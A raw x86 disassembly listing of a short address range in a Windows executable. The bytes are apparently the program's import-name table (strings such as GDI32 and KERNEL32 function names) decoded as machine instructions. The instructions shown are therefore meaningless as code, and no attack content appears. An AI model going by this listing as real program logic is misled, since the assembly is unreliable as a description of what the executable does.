  41dda4:	je     0x41de0b
  41dda6:	inc    esi
  41dda7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4d],0x69707061
  41ddaf:	outs   dx,BYTE PTR ds:[esi]
  41ddb0:	addr16 push edi
  41ddb2:	add    BYTE PTR [eax],al
  41ddb4:	mov    ah,0x0
  41ddb6:	inc    ebx
  41ddb7:	outs   dx,DWORD PTR ds:[esi]
  41ddb8:	ins    DWORD PTR es:[edi],dx
  41ddb9:	jo     0x41de1c
  41ddbb:	jb     0x41de22
  41ddbd:	push   ebx
  41ddbe:	je     0x41de32
  41ddc0:	imul   ebp,DWORD PTR [esi+0x67],0xfe000057
  41ddc7:	add    BYTE PTR [ebp+eiz*2+0x66],al
  41ddcb:	imul   ebp,DWORD PTR [esi+0x65],0x44736f44
  41ddd2:	gs jbe 0x41de3e
  41ddd5:	arpl   WORD PTR [ebp+0x57],sp
  41ddd8:	add    BYTE PTR [eax],al
  41ddda:	out    0x0,eax
  41dddc:	inc    ebx
  41dddd:	jb     0x41de44
  41dddf:	popa   
  41dde0:	je     0x41de47
  41dde2:	push   ebx
  41dde3:	gs ins DWORD PTR es:[edi],dx
  41dde5:	popa   
  41dde6:	jo     0x41de50
  41dde8:	outs   dx,DWORD PTR ds:[esi]
  41dde9:	jb     0x41de50
  41ddeb:	inc    ecx
  41ddec:	add    BYTE PTR [eax],al
  41ddee:	fadd   QWORD PTR [ebx]
  41ddf0:	push   ebx
  41ddf1:	gs popa 
  41ddf3:	jb     0x41de58
  41ddf5:	push   0x68746150
  41ddfa:	push   edi
  41ddfb:	add    BYTE PTR [eax+eax*1+0x636e6143],ah
  41de02:	gs ins BYTE PTR es:[edi],dx
  41de04:	dec    ecx
  41de05:	outs   dx,DWORD PTR ds:[esi]
  41de06:	add    BYTE PTR [eax],al
  41de08:	add    al,0x3
  41de0a:	dec    esp
  41de0b:	gs popa 
  41de0d:	jbe    0x41de74
  41de0f:	inc    ebx
  41de10:	jb     0x41de7b
  41de12:	je     0x41de7d
  41de14:	arpl   WORD PTR [ecx+0x6c],sp
  41de17:	push   ebx
  41de18:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41de1d:	outs   dx,BYTE PTR ds:[esi]
  41de1e:	add    BYTE PTR [eax],al
  41de20:	inc    ebp
  41de21:	add    al,BYTE PTR [edi+0x65]
  41de24:	je     0x41de79
  41de26:	je     0x41de89
  41de28:	jb     0x41de9e
  41de2a:	jne    0x41de9c
  41de2c:	dec    ecx
  41de2d:	outs   dx,BYTE PTR ds:[esi]
  41de2e:	outs   dx,WORD PTR ds:[esi]
  41de30:	push   edi
  41de31:	add    dl,bl
  41de33:	add    cl,BYTE PTR [ecx+0x73]
  41de36:	push   esi
  41de37:	popa   
  41de38:	ins    BYTE PTR es:[edi],dx
  41de39:	imul   esp,DWORD PTR [esp+ecx*2+0x61],0x6175676e
  41de41:	addr16 gs inc edi
  41de44:	jb     0x41deb5
  41de46:	jne    0x41deb8
  41de48:	add    BYTE PTR [eax],al
  41de4a:	in     al,0x3
  41de4c:	push   ebx
  41de4d:	gs je  0x41de93
  41de50:	outs   dx,DWORD PTR ds:[esi]
  41de51:	ins    DWORD PTR es:[edi],dx
  41de52:	ins    DWORD PTR es:[edi],dx
  41de53:	push   esp
  41de54:	imul   ebp,DWORD PTR [ebp+0x65],0x7374756f
  41de5b:	add    BYTE PTR [edx+0x4],dl
  41de5e:	push   ebx
  41de5f:	jns    0x41ded4
  41de61:	je     0x41dec8
  41de63:	ins    DWORD PTR es:[edi],dx
  41de64:	push   esp
  41de65:	imul   ebp,DWORD PTR [ebp+0x65],0x69466f54
  41de6c:	ins    BYTE PTR es:[edi],dx
  41de6d:	gs push esp
  41de6f:	imul   ebp,DWORD PTR [ebp+0x65],0x32b0000
  41de76:	dec    ebp
  41de77:	outs   dx,DWORD PTR ds:[esi]
  41de78:	jbe    0x41dedf
  41de7a:	inc    esi
  41de7b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0xc5004178
  41de83:	add    al,0x6c
  41de85:	jae    0x41defb
  41de87:	jb     0x41deec
  41de89:	ins    DWORD PTR es:[edi],dx
  41de8a:	jo     0x41def5
  41de8c:	inc    ecx
  41de8d:	add    BYTE PTR [ecx+0x2],cl
  41de90:	inc    edi
  41de91:	gs je  0x41dee7
  41de94:	je     0x41df08
  41de96:	imul   ebp,DWORD PTR [esi+0x67],0x65707954
  41de9d:	inc    ebp
  41de9e:	js     0x41def7
  41dea0:	add    BYTE PTR [eax],al
  41dea2:	fld    QWORD PTR [eax]
  41dea4:	inc    ebx
  41dea5:	jb     0x41df0c
  41dea7:	popa   
  41dea8:	je     0x41df0f
  41deaa:	dec    ebp
  41deab:	jne    0x41df21
  41dead:	gs js  0x41def1
  41deb0:	add    BYTE PTR [eax],al
  41deb2:	dec    ebx
  41deb3:	inc    ebp
  41deb4:	push   edx
  41deb5:	dec    esi
  41deb6:	inc    ebp
  41deb7:	dec    esp
  41deb8:	xor    esi,DWORD PTR [edx]
  41deba:	cs fs ins BYTE PTR es:[edi],dx
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	add    BYTE PTR [eax],al
  41dec0:	jno    0x41dec3
  41dec2:	inc    edi
  41dec3:	gs je  0x41df18
  41dec6:	dec    edi
  41dec7:	push   eax
  41dec8:	xor    al,BYTE PTR [eax]
  41deca:	mov    cl,0x0
  41decc:	inc    esp
  41decd:	push   eax
  41dece:	je     0x41df3f
  41ded0:	dec    esp
  41ded1:	push   eax
  41ded2:	add    BYTE PTR [eax],al
  41ded4:	fld    QWORD PTR [ecx]
  41ded6:	push   ebx
  41ded7:	gs je  0x41df1e
  41deda:	dec    ecx
  41dedb:	inc    edx
  41dedc:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x6e4500c5
  41dee4:	jne    0x41df53
  41dee6:	inc    esi
  41dee7:	outs   dx,DWORD PTR ds:[esi]
  41dee8:	outs   dx,BYTE PTR ds:[esi]
  41dee9:	je     0x41df31
  41deeb:	popa   
  41deec:	ins    DWORD PTR es:[edi],dx
  41deed:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0xa2005773
  41def5:	add    BYTE PTR [ebx+0x72],al
  41def8:	gs popa 
  41defa:	je     0x41df61
  41defc:	dec    ecx
  41defd:	inc    ebx
  41defe:	push   edi
  41deff:	add    BYTE PTR [ecx+0x1],bh
  41df02:	inc    edi
  41df03:	gs je  0x41df59
  41df06:	jns    0x41df7b
  41df08:	je     0x41df6f
  41df0a:	ins    DWORD PTR es:[edi],dx
  41df0b:	push   eax
  41df0c:	popa   
  41df0d:	ins    BYTE PTR es:[edi],dx
  41df0e:	gs je  0x41df85
  41df11:	gs inc ebp
  41df13:	outs   dx,BYTE PTR ds:[esi]
  41df14:	je     0x41df88
  41df16:	imul   esp,DWORD PTR [ebp+0x73],0x4300ab00
  41df1d:	jb     0x41df84
  41df1f:	popa   
  41df20:	je     0x41df87
  41df22:	push   edx
  41df23:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41df28:	outs   dx,BYTE PTR ds:[esi]
  41df29:	add    BYTE PTR [edi+0x1],bl
  41df2c:	inc    edi
  41df2d:	gs je  0x41df7d
  41df30:	popa   
  41df31:	jo     0x41df80
  41df33:	outs   dx,DWORD PTR ds:[esi]
  41df34:	fs add BYTE PTR gs:[eax],al
  41df38:	lahf   
  41df39:	add    BYTE PTR [ebx+0x72],al
  41df3c:	gs popa 
  41df3e:	je     0x41dfa5
  41df40:	dec    eax
  41df41:	popa   
  41df42:	ins    BYTE PTR es:[edi],dx
  41df43:	data16 je 0x41dfb5
  41df46:	outs   dx,BYTE PTR ds:[esi]
  41df47:	gs push eax
  41df49:	popa   
  41df4a:	ins    BYTE PTR es:[edi],dx
  41df4b:	gs je  0x41dfc2
  41df4e:	gs add dh,ch
  41df51:	add    DWORD PTR [ebx+0x65],edx
  41df54:	je     0x41dfa6
  41df56:	popa   
  41df57:	ins    BYTE PTR es:[edi],dx
  41df58:	gs je  0x41dfcf
  41df5b:	gs inc ebp
  41df5d:	outs   dx,BYTE PTR ds:[esi]
  41df5e:	je     0x41dfd2
  41df60:	imul   esp,DWORD PTR [ebp+0x73],0x43009400
  41df67:	jb     0x41dfce
  41df69:	popa   
  41df6a:	je     0x41dfd1
  41df6c:	inc    esp
  41df6d:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  41df74:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  41df78:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd50070
  41df80:	inc    ebp
  41df81:	js     0x41dff7
  41df83:	push   esp
  41df84:	gs js  0x41dffb
  41df87:	dec    edi
  41df88:	jne    0x41dffe
  41df8a:	push   edi
  41df8b:	add    BYTE PTR [edx+eax*1],cl
  41df8e:	push   esp
  41df8f:	gs js  0x41e006
  41df92:	dec    edi
  41df93:	jne    0x41e009
  41df95:	push   edi
  41df96:	add    BYTE PTR [eax],al
  41df98:	dec    ebx
  41df99:	add    DWORD PTR [edi+0x65],eax
  41df9c:	je     0x41dfe4
  41df9e:	outs   dx,DWORD PTR ds:[esi]
  41df9f:	outs   dx,BYTE PTR ds:[esi]
  41dfa0:	je     0x41dfe6
  41dfa2:	popa   
  41dfa3:	je     0x41e006
  41dfa5:	add    BYTE PTR [edi],bh
  41dfa7:	add    DWORD PTR [edi+0x65],eax
  41dfaa:	je     0x41dff0
  41dfac:	dec    ecx
  41dfad:	inc    edx
  41dfae:	inc    ebx
  41dfaf:	outs   dx,DWORD PTR ds:[esi]
  41dfb0:	ins    BYTE PTR es:[edi],dx
  41dfb1:	outs   dx,DWORD PTR ds:[esi]
  41dfb2:	jb     0x41e008
  41dfb4:	popa   
  41dfb5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41dfb9:	add    BYTE PTR [ecx+eax*1+0x796c6f50],dh
  41dfc0:	ins    BYTE PTR es:[edi],dx
  41dfc1:	imul   ebp,DWORD PTR [esi+0x65],0x1890000
  41dfc8:	inc    edi
  41dfc9:	gs je  0x41e020
  41dfcc:	gs js  0x41e043
  41dfcf:	inc    esi
  41dfd0:	popa   
  41dfd1:	arpl   WORD PTR [ebp+0x57],sp
  41dfd4:	add    BYTE PTR [eax],al
  41dfd6:	jnp    0x41dfd9
  41dfd8:	inc    edi
  41dfd9:	gs je  0x41e030
  41dfdc:	gs js  0x41e053
  41dfdf:	inc    ecx
  41dfe0:	ins    BYTE PTR es:[edi],dx
  41dfe1:	imul   esp,DWORD PTR [edi+0x6e],0x890000
  41dfe8:	inc    ebx
  41dfe9:	jb     0x41e050
  41dfeb:	popa   
  41dfec:	je     0x41e053
  41dfee:	inc    edx
  41dfef:	jb     0x41e066
  41dff1:	jae    0x41e05b
  41dff3:	dec    ecx
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	imul   esi,DWORD PTR fs:[edx+0x65],0x24007463
  41dffd:	add    DWORD PTR [edi+0x65],eax
  41e000:	je     0x41e044
  41e002:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  41e006:	add    BYTE PTR gs:[ecx+eax*1+0x47],bl
  41e00b:	gs je  0x41e05a
  41e00e:	popa   
  41e00f:	jns    0x41e080
  41e011:	jne    0x41e087
  41e013:	add    BYTE PTR [eax+0x65724300],dh
  41e019:	popa   
  41e01a:	je     0x41e081
  41e01c:	push   ebx
  41e01d:	outs   dx,DWORD PTR ds:[esi]
  41e01e:	ins    BYTE PTR es:[edi],dx
  41e01f:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  41e027:	add    ah,al
  41e029:	add    BYTE PTR [ebp+0x6e],al
  41e02c:	jne    0x41e09b
  41e02e:	inc    esi
  41e02f:	outs   dx,DWORD PTR ds:[esi]
  41e030:	outs   dx,BYTE PTR ds:[esi]
  41e031:	je     0x41e079
  41e033:	popa   
  41e034:	ins    DWORD PTR es:[edi],dx
  41e035:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  41e03d:	add    BYTE PTR [eax+0x65724300],cl
  41e043:	popa   
  41e044:	je     0x41e0ab
  41e046:	inc    edx
  41e047:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  41e04f:	imul   esi,DWORD PTR [edx+0x65],0x7463
  41e056:	xchg   DWORD PTR [eax],eax
  41e058:	inc    ebx
  41e059:	jb     0x41e0c0
  41e05b:	popa   
  41e05c:	je     0x41e0c3
  41e05e:	inc    edx
  41e05f:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xa7000070
  41e067:	add    BYTE PTR [ebx+0x72],al
  41e06a:	gs popa 
  41e06c:	je     0x41e0d3
  41e06e:	push   eax
  41e06f:	outs   dx,BYTE PTR gs:[esi]
  41e071:	add    BYTE PTR [edx+0x65724300],dl
  41e077:	popa   
  41e078:	je     0x41e0df
  41e07a:	inc    esp
  41e07b:	dec    ecx
  41e07c:	inc    edx
  41e07d:	push   ebx
  41e07e:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  41e083:	outs   dx,BYTE PTR ds:[esi]
  41e084:	add    BYTE PTR [eax],al
  41e086:	add    DWORD PTR [eax],0x626d6f43
  41e08c:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  41e093:	add    BYTE PTR [esi+0x1],ah
  41e096:	inc    edi
  41e097:	gs je  0x41e0e8
  41e09a:	gs popa 
  41e09c:	jb     0x41e103
  41e09e:	jae    0x41e114
  41e0a0:	push   eax
  41e0a1:	popa   
  41e0a2:	ins    BYTE PTR es:[edi],dx
  41e0a3:	gs je  0x41e11a
  41e0a6:	gs dec ecx
  41e0a8:	outs   dx,BYTE PTR ds:[esi]
  41e0a9:	fs gs js 0x41e0ad
  41e0ad:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  41e0b4:	jo     0x41e129
  41e0b6:	add    BYTE PTR gs:[edx+0x74654701],cl
  41e0bd:	push   esp
  41e0be:	gs js  0x41e135
  41e0c1:	dec    ebp
  41e0c2:	gs je  0x41e137
  41e0c5:	imul   esp,DWORD PTR [ebx+0x73],0x1b80041
  41e0cc:	push   edx
  41e0cd:	gs popa 
  41e0cf:	ins    BYTE PTR es:[edi],dx
  41e0d0:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  41e0d7:	je     0x41e14d
  41e0d9:	add    BYTE PTR gs:[eax],al
  41e0dc:	lar    edx,WORD PTR [ebp+0x6e]
  41e0e0:	jb     0x41e147
  41e0e2:	popa   
  41e0e3:	ins    BYTE PTR es:[edi],dx
  41e0e4:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  41e0eb:	arpl   WORD PTR [eax+eax*1-0x6],si
  41e0ef:	add    DWORD PTR [ebx+0x65],edx
  41e0f2:	je     0x41e148
  41e0f4:	gs js  0x41e16b
  41e0f7:	inc    ebx
  41e0f8:	outs   dx,DWORD PTR ds:[esi]
  41e0f9:	ins    BYTE PTR es:[edi],dx
  41e0fa:	outs   dx,DWORD PTR ds:[esi]
  41e0fb:	jb     0x41e0fd
  41e0fd:	add    BYTE PTR [esi+0x646e4500],bh
  41e103:	inc    esp
  41e104:	outs   dx,DWORD PTR ds:[esi]
  41e105:	arpl   WORD PTR [eax],ax
  41e107:	add    BYTE PTR [edx+0x1],bh
  41e10a:	inc    edi
  41e10b:	gs je  0x41e161
  41e10e:	jns    0x41e183
  41e110:	je     0x41e177
  41e112:	ins    DWORD PTR es:[edi],dx
  41e113:	push   eax
  41e114:	popa   
  41e115:	ins    BYTE PTR es:[edi],dx
  41e116:	gs je  0x41e18d
  41e119:	gs push ebp
  41e11b:	jae    0x41e182
  41e11d:	add    dh,bl
  41e11f:	add    DWORD PTR [ebx+0x65],edx
  41e122:	je     0x41e168
  41e124:	dec    ecx
  41e125:	inc    edx
  41e126:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  41e12e:	imul   esp,DWORD PTR [ebx+0x65],0x5301dc00
  41e135:	gs je  0x41e17c
  41e138:	dec    ecx
  41e139:	inc    edx
  41e13a:	inc    ebx
  41e13b:	outs   dx,DWORD PTR ds:[esi]
  41e13c:	ins    BYTE PTR es:[edi],dx
  41e13d:	outs   dx,DWORD PTR ds:[esi]
  41e13e:	jb     0x41e194
  41e140:	popa   
  41e141:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e145:	add    al,dl
  41e147:	add    DWORD PTR [ebx+0x65],edx
  41e14a:	je     0x41e18d
  41e14c:	bound  ebp,QWORD PTR [edi+0x72]
  41e14f:	je     0x41e1a1
  41e151:	jb     0x41e1c2
  41e153:	arpl   WORD PTR [eax],ax
  41e155:	add    ah,al
  41e157:	add    DWORD PTR [edx+0x65],edx
  41e15a:	jae    0x41e1c5
  41e15c:	jp     0x41e1c3
  41e15e:	push   eax
  41e15f:	popa   
  41e160:	ins    BYTE PTR es:[edi],dx
  41e161:	gs je  0x41e1d8
  41e164:	add    BYTE PTR gs:[edx+eax*1],dl
  41e168:	push   edi
  41e169:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  41e171:	add    dh,cl
  41e173:	add    BYTE PTR [ebp+0x78],al
  41e176:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  41e17a:	gs inc ebx
  41e17c:	ins    BYTE PTR es:[edi],dx
  41e17d:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41e184:	xchg   esi,eax
  41e185:	add    BYTE PTR [ebx+0x72],al
  41e188:	gs popa 
  41e18a:	je     0x41e1f1
  41e18c:	inc    ebp
  41e18d:	ins    BYTE PTR es:[edi],dx
  41e18e:	ins    BYTE PTR es:[edi],dx
  41e18f:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  41e196:	outs   dx,BYTE PTR ds:[esi]
  41e197:	dec    ecx
  41e198:	outs   dx,BYTE PTR ds:[esi]
  41e199:	imul   esi,DWORD PTR fs:[edx+0x65],0xc1007463
  41e1a1:	add    DWORD PTR [edx+0x65],edx
  41e1a4:	ins    DWORD PTR es:[edi],dx
  41e1a5:	outs   dx,DWORD PTR ds:[esi]
  41e1a6:	jbe    0x41e20d
  41e1a8:	inc    esi
  41e1a9:	outs   dx,DWORD PTR ds:[esi]
  41e1aa:	outs   dx,BYTE PTR ds:[esi]
  41e1ab:	je     0x41e1ff
  41e1ad:	gs jae 0x41e21f
  41e1b0:	jne    0x41e224
  41e1b2:	arpl   WORD PTR [ebp+0x57],sp
  41e1b5:	add    BYTE PTR [edi+0x65724300],cl
  41e1bb:	popa   
  41e1bc:	je     0x41e223
  41e1be:	inc    esp
  41e1bf:	inc    ebx
  41e1c0:	push   edi
  41e1c1:	add    BYTE PTR [edx+0x65724300],ch
  41e1c7:	popa   
  41e1c8:	je     0x41e22f
  41e1ca:	push   eax
  41e1cb:	outs   dx,DWORD PTR ds:[esi]
  41e1cc:	ins    BYTE PTR es:[edi],dx
  41e1cd:	jns    0x41e236
  41e1cf:	outs   dx,DWORD PTR ds:[esi]
  41e1d0:	outs   dx,BYTE PTR ds:[esi]
  41e1d1:	push   edx
  41e1d2:	outs   dx,BYTE PTR ds:[si]
  41e1d4:	add    BYTE PTR [eax],al
  41e1d6:	mov    es,WORD PTR [ecx]
  41e1d8:	inc    edi
  41e1d9:	gs je  0x41e232
  41e1dc:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41e1e3:	dec    edi
  41e1e4:	jb     0x41e24d
  41e1e6:	inc    ebp
  41e1e7:	js     0x41e1e9
  41e1e9:	add    BYTE PTR [edi+0x44],al
  41e1ec:	dec    ecx
  41e1ed:	xor    esi,DWORD PTR [edx]
  41e1ef:	cs fs ins BYTE PTR es:[edi],dx
  41e1f2:	ins    BYTE PTR es:[edi],dx
  41e1f3:	add    BYTE PTR [eax+eax*1+0x74736544],dl
  41e1fa:	jb     0x41e26b
  41e1fc:	jns    0x41e241
  41e1fe:	popa   
  41e1ff:	jb     0x41e266
  41e201:	je     0x41e203
  41e203:	add    BYTE PTR [eax+0x61724400],dh
  41e209:	ja     0x41e251
  41e20b:	outs   dx,DWORD PTR ds:[esi]
  41e20c:	arpl   WORD PTR [ebp+0x73],si
  41e20f:	push   edx
  41e210:	arpl   WORD PTR gs:[eax+eax*1-0x4e],si
  41e215:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e219:	fs dec ecx
  41e21b:	ins    DWORD PTR es:[edi],dx
  41e21c:	popa   
  41e21d:	addr16 gs push edi
  41e220:	add    BYTE PTR [eax],al
  41e222:	mov    eax,0x69615702
  41e227:	je     0x41e276
  41e229:	gs jae 0x41e29f
  41e22c:	popa   
  41e22d:	add    BYTE PTR gs:[bx+0x4400],dl
  41e233:	gs jae 0x41e2aa
  41e236:	jb     0x41e2a7
  41e238:	jns    0x41e287
  41e23a:	outs   dx,BYTE PTR gs:[esi]
  41e23c:	jne    0x41e23e
  41e23e:	stos   DWORD PTR es:[edi],eax
  41e23f:	add    BYTE PTR [edx+esi*2+0x61],al
  41e243:	ja     0x41e286
  41e245:	outs   dx,BYTE PTR ds:[esi]
  41e246:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  41e24d:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  41e252:	mov    BYTE PTR [eax],al
  41e254:	inc    esp
  41e255:	gs inc sp
  41e258:	ins    BYTE PTR es:[edi],dx
  41e259:	addr16 push eax
  41e25b:	jb     0x41e2cc
  41e25d:	arpl   WORD PTR [edi+0x0],dx
  41e260:	add    DWORD PTR [eax],eax
  41e262:	inc    ecx
  41e263:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  41e267:	popa   
  41e268:	je     0x41e2cf
  41e26a:	dec    ebx
  41e26b:	gs jns 0x41e2d0
  41e26e:	outs   dx,DWORD PTR ds:[esi]
  41e26f:	popa   
  41e270:	jb     0x41e2d6
  41e272:	dec    esp
  41e273:	popa   
  41e274:	jns    0x41e2e5
  41e276:	jne    0x41e2ec
  41e278:	add    BYTE PTR [eax],al
  41e27a:	data16 add dl,BYTE PTR [ebx+0x65]
  41e27e:	je     0x41e2d4
  41e280:	imul   ebp,DWORD PTR [ebp+0x65],0x75000072
  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
